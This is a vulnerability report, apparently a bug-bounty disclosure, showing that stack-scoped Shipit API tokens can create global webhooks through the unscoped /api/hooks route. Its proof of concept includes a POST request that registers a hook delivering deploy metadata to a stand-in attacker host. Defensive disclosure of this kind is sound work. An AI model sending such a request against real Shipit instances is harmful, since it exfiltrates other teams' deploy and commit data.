### Title
Stack-scoped `ApiClient` can create/manage global webhooks via `Shipit::Api::HooksController`, escalating read access beyond its authorized stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::ApiClient` can be scoped to a single `Stack` (`belongs_to :stack, optional: true`) so that a token is only authorized to act on that one stack. [1](#0-0)  `Shipit::Api::BaseController#stacks` enforces this binding for stack-nested resources by scoping `Stack.where(id: current_api_client.stack_id)` when the client is stack-bound. [2](#0-1)  However, `Shipit::Api::HooksController` is mounted twice in `config/routes.rb`: once nested under a stack (`/api/stacks/:stack_id/hooks`) and once at the top level, unscoped (`/api/hooks`). [3](#0-2)  The controller's private `stack_id` helper only calls the stack-scoping `stack` method when `params[:stack_id]` is present; on the top-level route it simply returns `nil`, so the `hooks` scope becomes `Hook.where(stack_id: nil)` (global hooks) without ever invoking `current_api_client.stack_id?` restriction. [4](#0-3)  Any `ApiClient` — including one that is stack-scoped (`stack_id?` true) — that holds the `write:hook`/`read:hook` permission can therefore create, read, update, or destroy **global** hooks, which fire for every stack in the Shipit install.

### Finding Description
The equality that should hold is: **the stack a token authorizes == the stack the action touches**. `ApiClient#stack_id` is the mechanism that binds a token to a single stack, and `BaseController#stacks`/`#stack` are the only place this binding is enforced (via `stacks.from_param!`). [2](#0-1) 

`HooksController` breaks this binding:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [4](#0-3) 

When the request hits the top-level `/api/hooks` route (registered at `config/routes.rb:46`), `params[:stack_id]` is never present, so `stack_id` returns `nil` without calling `stack` (and therefore without ever consulting `current_api_client.stack_id?`/`stacks`). `Hook.where(stack_id: nil)` selects/creates **global** hooks — these are delivered for events across every stack in the instance, as implemented by `Hook.for_stack`/`Hook.deliver`, which matches hooks with `stack_id` equal to `nil` OR the specific stack. [5](#0-4)  Only the permission check `require_permission :read, :hook`/`:write, :hook` gates this endpoint — it does not check whether the requesting `ApiClient` is itself stack-scoped, nor which stack it is scoped to. [6](#0-5) 

Before the attacker's action: a stack-scoped `ApiClient` (e.g. `stack: shipit`, permissions `['write:hook']`) is intended to only read/write resources under `Stack#shipit` (per `BaseController#stacks`).
After the attacker's action: the same token creates a global `Hook` (`stack_id: nil`) with an attacker-controlled `delivery_url`/`events`, which will subsequently receive event payloads (deploy status, commit shas, task/deploy metadata) for **every** stack in the deployment, not just the one the token was scoped to.

### Impact Explanation
This is a permission-scope escalation: a low-privilege, single-stack API token can obtain webhook deliveries (`Hook#deliver!`) containing deploy/commit/task metadata for every other stack managed by the Shipit instance, none of which the token holds `read:stack` on. This matches the in-scope "High" impact category of escalation into unauthorized read of stack state/deploy output, achieved purely through a token the application itself issued and scoped to one stack.

### Likelihood Explanation
Likelihood is medium: it requires an `ApiClient` that has been granted `write:hook` (or `read:hook`) permission, which is plausible since `write:hook` is a common grant for any integration that manages its own stack's webhook (e.g. CI systems configuring notifications) — the `stack` scoping field on `ApiClient` gives operators false confidence that such a client's blast radius is limited to its own stack, when in fact the hook-management endpoint ignores that scoping.

### Recommendation
In `Shipit::Api::HooksController`, reject (403/404) hook management operations against the top-level/global scope unless the current `ApiClient` is unscoped (`!current_api_client.stack_id?`), or alternatively require an explicit additional permission for managing global hooks. At minimum, `stack_id` should always defer to the stack-scoping logic in `BaseController#stack`/`#stacks` (so `current_api_client.stack_id?` is consulted) rather than bypassing it when `params[:stack_id]` is absent.

### Proof of Concept
1. Create a stack-scoped `ApiClient` restricted to `Stack A`, with permission `write:hook` (a plausible/common grant, e.g. for a CI integration to register a deploy-notification webhook for its own stack).
2. Using this token, call the top-level unscoped route:
   ```
   POST /api/hooks
   Authorization: Basic <token for stack-scoped client>
   {
     "delivery_url": "https://attacker.example.com/collect",
     "events": ["deploy", "rollback", "task"]
   }
   ```
   confirmed reachable per the existing test `"#create adds a new hook"` which hits `POST /api/hooks` without a `stack_id` and succeeds. [7](#0-6) 
3. The created `Hook` has `stack_id: nil` (global) and will now receive `Hook.emit` deliveries for deploys/rollbacks/tasks on **all** stacks in the instance, per `Hook.deliver`/`for_stack` matching any hook with `stack_id: nil`. [8](#0-7) 
4. The attacker's stack-scoped token, which was never granted `read:stack` on other stacks, now passively exfiltrates deploy/commit metadata for every stack via the webhook delivery.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
